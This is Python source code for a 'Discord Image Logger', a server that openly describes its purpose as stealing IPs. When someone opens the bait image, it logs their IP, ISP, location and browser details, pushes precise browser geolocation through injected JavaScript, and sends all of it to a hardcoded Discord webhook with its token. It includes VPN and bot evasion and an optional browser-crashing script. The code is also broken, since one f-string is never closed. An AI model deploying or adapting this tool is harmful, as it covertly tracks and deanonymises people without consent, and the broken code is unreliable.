# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, json, socket  # Import HTTPServer, json, and socket


__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.1"  # Updated version
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1344770901966848031/N8m5tGlN0n-K3KZ5pQ89zreiWd0kZxFh-t12bNEt1CRp0_P4UMie96PnsIWbAbYSXumI",  #REPLACE WITH YOUR WEBHOOK
    "image": "https://i1.sndcdn.com/artworks-000349102620-mufv3v-t500x500.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.)  ENABLED by default
    "requestLocation": True,   # Request location through browser prompt (more accurate, but requires user permission)

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format.  Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",  # Consider removing @everyone for error reports in a production environment
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"  # Consider removing @everyone in a production environment

    # --- IP API and VPN/Proxy/Hosting Check ---
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        # print(f"DEBUG: ip-api response: {info}") # For debugging
    except requests.exceptions.RequestException as e:
        reportError(f"Error fetching IP info: {e}")
        info = {}  # Set info to an empty dictionary to avoid errors later


    if info.get("proxy"):
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""

    # --- OS and Browser Detection ---
    os, browser = "Unknown", "Unknown"  # Default values in case of parsing failure
    try:
        os, browser = httpagentparser.simple_detect(useragent)
    except Exception as e:
        reportError(f"Error parsing user agent: {e}")


    # --- Prepare Embed ---
    embed_description = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 'N/A'))+', '+str(info.get('lon', 'N/A')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'N/A').split('/')[1].replace('_', ' ') if info.get('timezone') else 'N/A'} ({info.get('timezone', 'N/A').split('/')[0] if info.get('timezone') else 'N/A'})`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Possibly') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
    {useragent}

    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": embed_description,
            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json=embed)
    except requests.exceptions.RequestException as e:
      reportError(f"Error sending webhook: {e}")

    return info  # Return the info for rich message use

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # --- URL Parsing ---
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    # Decode URL if provided as base64
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # --- HTML for Image Display ---
            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            # --- IP Blacklist Check ---
            forwarded_for = self.headers.get('x-forwarded-for')
            if not forwarded_for:
                client_ip = self.client_address[0] # Fallback to direct client IP
            else:
                client_ip = forwarded_for.split(',')[0].strip() # Get the leftmost IP
            
            if client_ip.startswith(blacklistedIPs):
                return

            # --- Bot Check and Handling ---
            if botCheck(client_ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(client_ip, endpoint = s.split("?")[0], url = url)
                
                return
            
            # --- Main Logic (Not a Bot) ---
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                coords = None  # Initialize coords

                if dic.get("g") and config["accurateLocation"]:
                    try:
                        coords = base64.b64decode(dic.get("g").encode()).decode()
                    except Exception as e:
                        reportError(f"Error decoding coordinates: {e}")
                        coords = None #Ensure coords is set even on error.

                    result = makeReport(client_ip, self.headers.get('user-agent'), coords, s.split("?")[0], url = url)
                else:
                    result = makeReport(client_ip, self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)

                # --- Message Handling ---
                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    # Use .get() to safely access dictionary keys
                    message = message.replace("{ip}", client_ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "N/A")))
                    message = message.replace("{long}", str(result.get("lon", "N/A")))
                    message = message.replace("{timezone}", f"{result.get('timezone', 'N/A').split('/')[1].replace('_', ' ') if result.get('timezone') else 'N/A'} ({result.get('timezone', 'N/A').split('/')[0] if result.get('timezone') else 'N/A'})")
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", "Possibly") if result.get("hosting") and not result.get("proxy") else "Possibly" if result.get("hosting") else "False"))
                    # Handle potentially missing os/browser.
                    os_browser = httpagentparser.simple_detect(self.headers.get('user-agent', '')) # Provide empty string as default
                    message = message.replace("{browser}", os_browser[1] if len(os_browser) > 1 else 'Unknown')
                    message = message.replace("{os}", os_browser[0] if len(os_browser) > 0 else 'Unknown')


                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                # --- Location Request (Geolocation API) ---
                if config["requestLocation"]: #This section is now controlled by a config option
                    data += b"""<script>
                    var currenturl = window.location.href;

                    if (!currenturl.includes("g=")) {
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(function (position) {
                                var latitude = position.coords.latitude;
                                var longitude = position.coords.longitude;
                                var coords = btoa(latitude + "," + longitude).replace(/=/g, "%3D");

                                var newUrl;
                                if (currenturl.includes("?")) {
                                    newUrl = currenturl + "&g=" + coords;
                                } else {
                                    newUrl = currenturl + "?g=" + coords;
                                }
                                window.location.replace(newUrl); // Use replace for cleaner history
                            },
                            function(error){
                                console.error("Geolocation error:", error);
                                //Optionally send the error to the webhook here.
                            },
                            {
                                enableHighAccuracy: true, // Get most accurate position possible
                                timeout: 10000, //  timeout 10 seconds
                                maximumAge: 0 // Do not use a cached position
                            });
                        }
                    }

                    </script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest


def run():
    # Use HTTPServer to serve the handler
    server_address = ('', 80)  # Listen on all interfaces, port 80
    httpd = HTTPServer(server_address, ImageLoggerAPI)
    print(f"Starting Image Logger server on port 80...\nGo to http://your-server-ip/ to test.")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
